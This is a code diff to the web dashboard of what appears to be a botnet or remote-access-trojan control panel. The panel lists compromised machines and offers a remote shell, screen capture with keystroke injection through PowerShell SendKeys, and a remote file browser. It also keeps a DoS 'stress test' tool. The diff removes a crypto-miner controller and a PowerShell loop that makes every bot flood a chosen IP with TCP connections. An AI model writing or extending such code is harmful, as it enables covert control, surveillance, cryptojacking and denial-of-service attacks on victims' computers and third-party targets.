@@ -54,8 +54,10 @@
         .content-area.active { display: flex; }
 
         /* Terminal */
-        .terminal-container { background: #000; border: 1px solid var(--border); display: flex; flex-direction: column; flex: 1; min-height: 400px; }
-        #command-output { flex: 1; padding: 1.5rem; font-family: 'JetBrains Mono'; font-size: 0.85rem; overflow-y: auto; color: #ff3333; border-bottom: 1px solid var(--border); white-space: pre-wrap; }
+        .terminal-container { background: #000; border: 1px solid var(--border); display: flex; flex-direction: column; flex: 1; min-height: 200px; }
+        .terminal-header { background: var(--sidebar); padding: 5px 15px; font-size: 0.65rem; color: var(--accent); border-bottom: 1px solid var(--border); font-weight: bold; text-transform: uppercase; }
+        #shell-output, #system-output { flex: 1; padding: 15px; font-family: 'JetBrains Mono'; font-size: 0.85rem; overflow-y: auto; color: #ff3333; border-bottom: 1px solid var(--border); white-space: pre-wrap; }
+        #system-output { color: #00ff00; }
         #command-input { background: none; border: none; color: white; font-family: 'JetBrains Mono'; padding: 15px; width: 100%; outline: none; }
 
         /* Explorer */
@@ -100,13 +102,7 @@
         
         <div class="global-control-panel">
             <h3 style="font-size: 0.6rem; color: var(--accent); margin: 0 0 8px 0;">NETWORK BROADCAST</h3>
-            <input type="text" id="global-miner-wallet" placeholder="Broadcast Wallet Address" class="meta-input" style="margin-bottom: 8px; font-size: 0.7rem;">
-            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 5px;">
-                <button class="btn-primary" onclick="broadcastMining('start')" style="font-size: 0.7rem;">Start All</button>
-                <button class="btn-danger" onclick="broadcastMining('stop')" style="font-size: 0.7rem;">Kill All</button>
-            </div>
-            
-            <div style="margin-top: 15px; border-top: 1px solid var(--border); padding-top: 10px;">
+            <div style="border-top: 1px solid var(--border); padding-top: 10px;">
                 <input type="text" id="broadcast-stress-ip" placeholder="Target IP" class="meta-input" style="font-size: 0.7rem; margin-bottom: 5px;">
                 <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 5px;">
                     <input type="number" id="broadcast-stress-port" placeholder="Port" value="80" class="meta-input" style="font-size: 0.7rem;">
@@ -130,15 +126,7 @@
 
         <div class="stats-bar">
             <div class="stat-item">
-                <span class="stat-label">Network Hashrate</span>
-                <span class="stat-value" id="net-hashrate">0.00 H/s</span>
-            </div>
-            <div class="stat-item">
-                <span class="stat-label">Total Shares</span>
-                <span class="stat-value" id="net-shares">0</span>
-            </div>
-            <div class="stat-item">
-                <span class="stat-label">Active Workers</span>
+                <span class="stat-label">Total Online Nodes</span>
                 <span class="stat-value" id="net-workers">0</span>
             </div>
         </div>
@@ -153,10 +141,15 @@
         <!-- CONSOLE -->
         <div id="tab-terminal" class="content-area active">
             <div style="display: flex; gap: 1rem; height: 100%;">
-                <div style="flex: 2; display: flex; flex-direction: column;">
+                <div style="flex: 2; display: flex; flex-direction: column; gap: 1rem;">
                     <div class="terminal-container">
-                        <div id="command-output">Awaiting input...</div>
-                        <input type="text" id="command-input" placeholder="Execute command..." onkeydown="if(event.key === 'Enter') sendCommand();">
+                        <div class="terminal-header">Remote Shell</div>
+                        <div id="shell-output">Awaiting input...</div>
+                        <input type="text" id="command-input" placeholder="Type directly into shell (#reset to kill hung apps)..." onkeydown="handleTerminalKey(event);" onkeyup="handleTerminalRelease(event);">
+                    </div>
+                    <div class="terminal-container" style="flex: 0.6; min-height: 150px;">
+                        <div class="terminal-header">System Console</div>
+                        <div id="system-output">Waiting for system logs...</div>
                     </div>
                 </div>
                 <div style="flex: 1; display: flex; flex-direction: column; gap: 1rem;">
@@ -164,14 +157,6 @@
                         <h4>Live Monitor</h4>
                         <img id="screenshot-image" style="width:100%; border: 1px solid var(--border); cursor: pointer; background:#000;" onclick="enterControlMode()">
                         <button class="btn-primary" style="width:100%; margin-top:10px" onclick="enterControlMode()">Remote Desktop</button>
-                    </div>
-                    <div class="quick-tool-card">
-                        <h4>Node Intel</h4>
-                        <div style="font-family: 'JetBrains Mono'; font-size: 0.8rem; line-height: 1.8;">
-                            Mining: <span id="node-stat-mining" style="color:var(--accent)">Null</span><br>
-                            Rate: <span id="node-stat-rate" style="color:var(--accent)">0 H/s</span><br>
-                            Shares: <span id="node-stat-shares" style="color:var(--accent)">0</span>
-                        </div>
                     </div>
                 </div>
             </div>
@@ -191,15 +176,7 @@
         <!-- TOOLS TAB -->
         <div id="tab-tools" class="content-area">
             <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem;">
-                <div class="quick-tool-card">
-                    <h4>Crypto Miner</h4>
-                    <input type="text" id="miner-wallet" placeholder="Wallet Address" class="meta-input">
-                    <div style="margin-top: 1rem; display: flex; gap: 10px;">
-                        <button class="btn-primary" onclick="runMiner('start')">Start</button>
-                        <button class="btn-danger" onclick="runMiner('stop')">Stop</button>
-                    </div>
-                </div>
-                <div class="quick-tool-card">
+                <div class="quick-tool-card" style="grid-column: span 2;">
                     <h4>Broadcast Stress Test (DoS)</h4>
                     <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
                         <input type="text" id="stress-host" placeholder="Target IP" class="meta-input">
@@ -239,48 +216,13 @@
     let current_client_hostname = null;
     let allConnectedClients = [];
     let isControlMode = false;
-    let commandHistory = {};
+    let shellHistory = {};
+    let systemHistory = {};
     let clientStates = {}; 
 
-    const HASH_REGEX = /Hashrate:\s+([\d\.]+)\s+H\/s\s+\|\s+Shares:\s+(\d+)/;
     const STALE_MS = 10000; 
     const DIR_JSON_MARKER = '##DIR_JSON##';
     const MICROBIN_URL_BASE = 'https://microbin.elaptic.dev/';
-
-    // COOKIE HELPERS
-    function setCookie(name, value, days = 365) {
-        const d = new Date();
-        d.setTime(d.getTime() + (days * 24 * 60 * 60 * 1000));
-        document.cookie = `${name}=${value};expires=${d.toUTCString()};path=/`;
-    }
-
-    function getCookie(name) {
-        const nameEQ = name + "=";
-        const ca = document.cookie.split(';');
-        for (let i = 0; i < ca.length; i++) {
-            let c = ca[i];
-            while (c.charAt(0) == ' ') c = c.substring(1, c.length);
-            if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
-        }
-        return "";
-    }
-
-    // Initialize wallet from cookies
-    const savedWallet = getCookie("erratic_wallet");
-    if (savedWallet) {
-        document.getElementById('global-miner-wallet').value = savedWallet;
-        document.getElementById('miner-wallet').value = savedWallet;
-    }
-
-    // Save wallet to cookies on change
-    ['global-miner-wallet', 'miner-wallet'].forEach(id => {
-        document.getElementById(id).addEventListener('input', (e) => {
-            const val = e.target.value;
-            setCookie("erratic_wallet", val);
-            document.getElementById('global-miner-wallet').value = val;
-            document.getElementById('miner-wallet').value = val;
-        });
-    });
 
     function switchTab(tabId) {
         document.querySelectorAll('.content-area').forEach(c => c.classList.remove('active'));
@@ -298,14 +240,11 @@
         clients.sort((a, b) => (a.online === b.online) ? 0 : a.online ? -1 : 1);
 
         clients.forEach(client => {
-            const state = clientStates[client.hostname] || { hashrate: 0, lastSeen: 0 };
-            const isMining = (Date.now() - state.lastSeen) < STALE_MS && state.hashrate > 0;
             const div = document.createElement('div');
             div.className = `client-card ${client.online ? 'online' : 'offline'} ${(current_client_hostname === client.hostname) ? 'selected' : ''}`;
             div.innerHTML = `
                 <div style="display:flex; justify-content:space-between; align-items:center;">
                     <div style="font-weight:600; font-size:0.85rem;"><span class="status-dot"></span>${client.alias || client.hostname}</div>
-                    ${isMining ? `<span style="font-size:0.6rem; color:red; font-family:monospace;">${Math.floor(state.hashrate)} H/s</span>` : ''}
                 </div>
             `;
             if (client.online) div.onclick = () => selectClient(client);
@@ -314,42 +253,54 @@
         updateGlobalStats();
     });
 
+    function updateTerminalUI(divId, text) {
+        const div = document.getElementById(divId);
+        if (!text) return;
+
+        for (let i = 0; i < text.length; i++) {
+            const char = text[i];
+            if (char === '\b') {
+                if (div.lastChild && div.lastChild.nodeType === 3) {
+                    const val = div.lastChild.nodeValue;
+                    if (val.length > 0) {
+                        div.lastChild.nodeValue = val.slice(0, -1);
+                    } else {
+                        div.removeChild(div.lastChild);
+                    }
+                }
+            } else if (char === '\r') {
+                continue;
+            } else {
+                div.appendChild(document.createTextNode(char));
+            }
+        }
+        div.scrollTop = div.scrollHeight;
+    }
+
     socket.on('command_output', (data) => {
         const targetClient = allConnectedClients.find(c => c.id === data.client_id);
         if (!targetClient) return;
-
-        if (data.output.includes(DIR_JSON_MARKER)) {
-            renderFileSystem(data.output.substring(data.output.indexOf(DIR_JSON_MARKER) + DIR_JSON_MARKER.length));
-            return;
-        }
-
-        const match = data.output.match(HASH_REGEX);
-        if (match) {
-            const rate = parseFloat(match[1]);
-            const shares = parseInt(match[2]);
-            if (!clientStates[targetClient.hostname]) clientStates[targetClient.hostname] = {};
-            clientStates[targetClient.hostname].hashrate = rate;
-            clientStates[targetClient.hostname].shares = shares;
-            clientStates[targetClient.hostname].lastSeen = Date.now();
-            updateGlobalStats();
-            if (data.client_id === current_client_id) refreshMiningUI();
-        }
-
-        if (!commandHistory[targetClient.hostname]) commandHistory[targetClient.hostname] = "";
-        commandHistory[targetClient.hostname] += data.output;
+        if (!shellHistory[targetClient.hostname]) shellHistory[targetClient.hostname] = "";
+        shellHistory[targetClient.hostname] += data.output;
         if (data.client_id === current_client_id) {
-            const outputDiv = document.getElementById('command-output');
-            outputDiv.appendChild(document.createTextNode(data.output));
-            outputDiv.scrollTop = outputDiv.scrollHeight;
+            updateTerminalUI('shell-output', data.output);
         }
     });
 
-    /* FILE EXPLORER FIX */
+    socket.on('system_output', (data) => {
+        const targetClient = allConnectedClients.find(c => c.id === data.client_id);
+        if (!targetClient) return;
+        if (!systemHistory[targetClient.hostname]) systemHistory[targetClient.hostname] = "";
+        systemHistory[targetClient.hostname] += data.output;
+        if (data.client_id === current_client_id) {
+            updateTerminalUI('system-output', data.output);
+        }
+    });
+
     function refreshFiles() {
         if (!current_client_id || !current_client_hostname) return;
-        // Ensure state exists before reading path
         if (!clientStates[current_client_hostname]) {
-            clientStates[current_client_hostname] = { currentPath: "C:\\", hashrate: 0, lastSeen: 0, shares: 0 };
+            clientStates[current_client_hostname] = { currentPath: "C:\\", line: "" };
         }
         const path = clientStates[current_client_hostname].currentPath || "C:\\";
         const cmd = `powershell -Command "$p='${path.replace(/'/g, "''")}'; if(Test-Path $p){ $items = Get-ChildItem -Path $p | Select-Object Name, @{Name='IsDirectory';Expression={$_.PSIsContainer}}, @{Name='Size';Expression={$_.Length}}; echo '${DIR_JSON_MARKER}' (ConvertTo-Json -InputObject $items) } else { echo '${DIR_JSON_MARKER} []' }"`;
@@ -362,7 +313,6 @@
         let currentPath = clientStates[current_client_hostname].currentPath;
         document.getElementById('current-path-display').textContent = currentPath;
         container.innerHTML = '';
-
         const back = document.createElement('div');
         back.className = 'file-item';
         back.innerHTML = `<div class="file-icon">📁</div><div class="file-meta"><div class="file-name">.. (Parent Directory)</div></div>`;
@@ -371,7 +321,6 @@
             if (parts.length > 1) { parts.pop(); clientStates[current_client_hostname].currentPath = parts.join('\\') + '\\'; refreshFiles(); }
         };
         container.appendChild(back);
-
         try {
             let items = JSON.parse(jsonStr.trim() || "[]");
             if (!Array.isArray(items)) items = items ? [items] : [];
@@ -393,12 +342,11 @@
         socket.emit('command', { 'command': cmd, 'client_id': current_client_id });
     }
 
-    /* REMOTE DESKTOP */
     function enterControlMode() {
         if (!current_client_id) return;
         isControlMode = true;
         document.getElementById('control-overlay').style.display = 'flex';
-        socket.emit('command', { 'command': '#scrsht 100', 'client_id': current_client_id });
+        socket.emit('system_command', { 'command': '#scrsht 100', 'client_id': current_client_id });
     }
 
     document.getElementById('control-image').onclick = function(e) {
@@ -410,28 +358,30 @@
         socket.emit('command', { 'command': cmd, 'client_id': current_client_id });
     };
 
-    window.addEventListener('keydown', (e) => { if (e.key === 'Escape' && isControlMode) { isControlMode = false; document.getElementById('control-overlay').style.display = 'none'; socket.emit('command', { 'command': '#scrsht 1000', 'client_id': current_client_id }); } });
+    function mapKeyToSendKeys(key) {
+        const map = { 'Enter': '{ENTER}', 'Backspace': '{BACKSPACE}', 'Escape': '{ESC}', 'Tab': '{TAB}', ' ': ' ', 'Control': '^', 'Shift': '+', 'Alt': '%', 'ArrowUp': '{UP}', 'ArrowDown': '{DOWN}', 'ArrowLeft': '{LEFT}', 'ArrowRight': '{RIGHT}', 'Delete': '{DEL}', 'Insert': '{INS}', 'Home': '{HOME}', 'End': '{END}', 'PageUp': '{PGUP}', 'PageDown': '{PGDN}' };
+        if (map[key]) return map[key];
+        if (key.length === 1) { if ("~%^(){}+".includes(key)) return "{" + key + "}"; return key; }
+        return "";
+    }
+
+    window.addEventListener('keydown', (e) => { 
+        if (!current_client_id) return;
+        if (e.key === 'Escape' && isControlMode) { 
+            isControlMode = false; document.getElementById('control-overlay').style.display = 'none'; 
+            socket.emit('system_command', { 'command': '#scrsht 1000', 'client_id': current_client_id }); return;
+        }
+        if (isControlMode) {
+            const sk = mapKeyToSendKeys(e.key);
+            if (sk) {
+                const cmd = `powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('${sk.replace(/'/g, "''")}')"`;
+                socket.emit('command', { 'command': cmd, 'client_id': current_client_id });
+            }
+            e.preventDefault();
+        }
+    });
+
     socket.on('screenshot_data', (data) => { if (data.client_id === current_client_id) { const s = "data:image/jpeg;base64," + data.image_data; document.getElementById('screenshot-image').src = s; if (isControlMode) document.getElementById('control-image').src = s; } });
-
-    /* TOOLS & BROADCAST */
-    function broadcastMining(action) {
-        const wallet = document.getElementById('global-miner-wallet').value || "WORKER";
-        allConnectedClients.forEach(c => { if(c.online) socket.emit('command', { command: `#miner ${action} 50 ${wallet}`, client_id: c.id }); });
-    }
-
-    function runMiner(action) {
-        const wallet = document.getElementById('miner-wallet').value || "WORKER";
-        socket.emit('command', { command: `#miner ${action} 50 ${wallet}`, client_id: current_client_id });
-    }
-
-    function broadcastStress() {
-        const host = document.getElementById('broadcast-stress-ip').value;
-        const port = document.getElementById('broadcast-stress-port').value;
-        const count = document.getElementById('broadcast-stress-count').value || 1000;
-        if(!host) return;
-        const cmd = `powershell -Command "1..${count} | ForEach { $t = New-Object Net.Sockets.TcpClient; try { $t.Connect('${host}', ${port}); $t.Close() } catch {} }"`;
-        allConnectedClients.forEach(c => { if(c.online) socket.emit('command', { command: cmd, client_id: c.id }); });
-    }
 
     function launchStressTest() {
         const host = document.getElementById('stress-host').value;
@@ -452,50 +402,92 @@
         container.innerHTML = '';
         macros.forEach(m => {
             const btn = document.createElement('button');
-            btn.className = 'btn-secondary';
-            btn.textContent = m.name;
+            btn.className = 'btn-secondary'; btn.textContent = m.name;
             btn.onclick = () => socket.emit('command', { command: m.command, client_id: current_client_id });
             container.appendChild(btn);
         });
     });
 
-    /* HELPERS */
     function selectClient(client) {
         current_client_id = client.id; current_client_hostname = client.hostname;
-        if (!clientStates[current_client_hostname]) clientStates[current_client_hostname] = { currentPath: "C:\\", hashrate: 0, lastSeen: 0, shares: 0 };
+        if (!clientStates[current_client_hostname]) clientStates[current_client_hostname] = { currentPath: "C:\\", line: "" };
         document.getElementById('node-title').textContent = (client.alias || client.hostname).toUpperCase();
-        document.getElementById('command-output').textContent = commandHistory[client.hostname] || "Connected.\n";
+        document.getElementById('shell-output').textContent = "";
+        updateTerminalUI('shell-output', shellHistory[client.hostname] || "Connected to Shell.\n");
+        document.getElementById('system-output').textContent = "";
+        updateTerminalUI('system-output', systemHistory[client.hostname] || "Connected to System.\n");
         if (client.screenshot_data) document.getElementById('screenshot-image').src = "data:image/jpeg;base64," + client.screenshot_data;
-        refreshMiningUI();
     }
 
-    function sendCommand() {
+    function handleTerminalKey(event) {
+        if (!current_client_id) return;
         const inp = document.getElementById('command-input');
-        if (current_client_id && inp.value) { socket.emit('command', { command: inp.value, client_id: current_client_id }); inp.value = ''; }
+        const val = inp.value;
+        const state = clientStates[current_client_hostname];
+
+        if (event.ctrlKey && event.key.toLowerCase() === 'c') {
+            socket.emit('system_command', { command: '#sigint', client_id: current_client_id });
+            state.line = "";
+            event.preventDefault(); return;
+        }
+        if (event.ctrlKey || event.altKey) return;
+
+        if (val.startsWith('#')) {
+            if (event.key === 'Enter') {
+                socket.emit('system_command', { command: val, client_id: current_client_id });
+                inp.value = ''; event.preventDefault();
+            }
+            return;
+        }
+
+        if (event.key === 'Enter') {
+            const cmd = state.line + '\r\n';
+            let erase = "";
+            for(let i=0; i<state.line.length; i++) erase += "\b";
+            updateTerminalUI('shell-output', erase);
+            socket.emit('stdin', { command: cmd, client_id: current_client_id });
+            state.line = "";
+            inp.value = '';
+            event.preventDefault();
+            return;
+        }
+
+        if (event.key === 'Backspace') {
+            if (state.line.length > 0) {
+                state.line = state.line.slice(0, -1);
+                updateTerminalUI('shell-output', '\b');
+            }
+            event.preventDefault();
+            return;
+        }
+
+        if (event.key.length === 1) {
+            state.line += event.key;
+            updateTerminalUI('shell-output', event.key);
+            setTimeout(() => { if(!inp.value.startsWith('#')) inp.value = ''; }, 10);
+        }
     }
 
+    function handleTerminalRelease(event) {
+        if (!current_client_id) return;
+        const state = clientStates[current_client_hostname];
+        if (event.ctrlKey && event.shiftKey && event.key.toLowerCase() === 'v') {
+            navigator.clipboard.readText().then(text => {
+                if (text) {
+                    state.line += text;
+                    updateTerminalUI('shell-output', text);
+                }
+            });
+        }
+    }
+
+    function sendCommand() {}
     function updateGlobalStats() {
-        let h = 0, s = 0, w = 0, now = Date.now();
-        allConnectedClients.forEach(c => {
-            const st = clientStates[c.hostname];
-            if (st && (now - st.lastSeen) < STALE_MS) { h += st.hashrate; s += st.shares; if (st.hashrate > 0) w++; }
-        });
-        document.getElementById('net-hashrate').textContent = h.toLocaleString() + " H/s";
-        document.getElementById('net-shares').textContent = s;
-        document.getElementById('net-workers').textContent = w;
+        const onlineCount = allConnectedClients.filter(c => c.online).length;
+        document.getElementById('net-workers').textContent = onlineCount;
     }
-
-    function refreshMiningUI() {
-        if (!current_client_hostname || !clientStates[current_client_hostname]) return;
-        const st = clientStates[current_client_hostname];
-        const m = st && (Date.now() - st.lastSeen) < STALE_MS && st.hashrate > 0;
-        document.getElementById('node-stat-mining').textContent = m ? "ACTIVE" : "Null";
-        document.getElementById('node-stat-rate').textContent = m ? st.hashrate.toLocaleString() + " H/s" : "0 H/s";
-        document.getElementById('node-stat-shares').textContent = st ? st.shares : "0";
-    }
-
     function saveMetadata() { socket.emit('update_metadata', { hostname: current_client_hostname, alias: document.getElementById('edit-alias').value, description: document.getElementById('edit-desc').value }); }
-    setInterval(() => { updateGlobalStats(); if (current_client_id) refreshMiningUI(); }, 2000);
+    setInterval(() => { updateGlobalStats(); }, 2000);
     {% endraw %}
 </script>
 </body>
